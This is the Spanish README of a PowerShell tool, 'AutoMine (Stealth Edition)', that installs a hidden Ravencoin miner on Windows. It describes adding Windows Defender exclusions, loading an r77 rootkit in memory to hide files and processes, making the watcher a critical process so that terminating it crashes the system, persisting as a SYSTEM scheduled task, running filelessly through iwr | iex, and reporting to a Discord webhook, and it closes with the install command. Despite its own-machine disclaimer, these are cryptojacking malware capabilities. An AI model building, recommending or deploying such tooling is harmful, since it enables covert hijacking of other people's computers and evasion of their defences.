# AutoMine (Stealth Edition)

Automatización avanzada de minería de Ravencoin (RVN) con GMiner en Windows. Integra persistencia vía Tarea Programada (SYSTEM), ocultamiento mediante Rootkit (r77), protección contra cierre (Proceso Crítico) y notificaciones vía Discord.

El script (`Mine.ps1`) descarga GMiner, configura exclusiones de Windows Defender, se oculta usando un rootkit en memoria, se marca como proceso crítico del sistema y registra una tarea de inicio automático. Un "watcher" invisible monitorea el minero, lo reinicia si se cae y reporta el estado a un Webhook de Discord. Todo el proceso sobrevive a reinicios y es inmune a la finalización desde el Administrador de Tareas.

## Disclaimer

Esta herramienta está diseñada para ser utilizada **únicamente en equipos de tu propiedad** o en entornos donde tengas autorización explícita. El autor no se hace responsable del uso indebido, del consumo eléctrico excesivo, del desgaste del hardware ni de cualquier consecuencia derivada de su ejecución. La minería no autorizada en equipos ajenos es una actividad ilegal.

**ADVERTENCIA DE SEGURIDAD:** El script utiliza técnicas de Rootkit y Proceso Crítico. Si intentas cerrar el proceso de PowerShell (`WinCache.ps1`) desde el Administrador de Tareas, **Windows lanzará un Pantallazo Azul (BSOD) inmediato**. Para detenerlo, usa siempre el parámetro `-Uninstall`.

## Características

- **Instalación todo-en-uno**: descarga GMiner, crea carpetas ocultas, configura Defender y registra la tarea de inicio en una sola ejecución.
- **Rootkit Integrado (r77)**: Descarga y ejecuta `rootkit.dll` en memoria para ocultar la carpeta de instalación (`C:\ProgramData\...\WinCache`) y los PIDs del watcher y del minero de las herramientas del sistema.
- **Proceso Crítico con Safe Shutdown**: El watcher se registra como proceso crítico. Si alguien intenta matarlo, el sistema colapsa. Sin embargo, incluye un manejador de eventos para "desmarcarse" de forma segura si apagas o reinicias Windows normalmente.
- **Ejecución en Memoria**: Soporta ejecución sin descargar el archivo a disco (vía `iwr | iex`).
- **Actualización Segura**: Si ejecutas el script de nuevo para actualizar parámetros, detecta la versión anterior, le quita el estado crítico, la mata limpiamente y despliega la nueva.
- **Auto-reinicio**: Si GMiner se cierra inesperadamente, el watcher lo relanza hasta 10 veces con un intervalo de 30 segundos.
- **Notificaciones Discord**: Envía avisos de inicio, actualizaciones y errores fatales.
- **Log Camuflado**: Registra la actividad en `cache.log` dentro de la carpeta oculta para parecer un archivo de sistema.

## Requisitos

- Windows 10/11 (x64).
- PowerShell 5.1 o superior.
- GPU compatible con KawPoW (NVIDIA o AMD). El rendimiento base esperado para una **RTX 3050** es de 12–14 MH/s.
- Una dirección de wallet de Ravencoin (RVN).
- Un Webhook de Discord (opcional, pero altamente recomendado para monitoreo ciego).

## Guía de Instalación

### Método 1: Ejecución Local (Tradicional)
1. Descarga el archivo `Mine.ps1` en la máquina que va a minar.
2. Abre **PowerShell como Administrador**.
3. Ejecuta el script:
   ```powershell
   .\Mine.ps1 -Wallet "TU_WALLET_RVN" `
              -Pool "us-rvn.2miners.com:6060" `
              -Algo "kawpow" `
              -DiscordWebhook "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"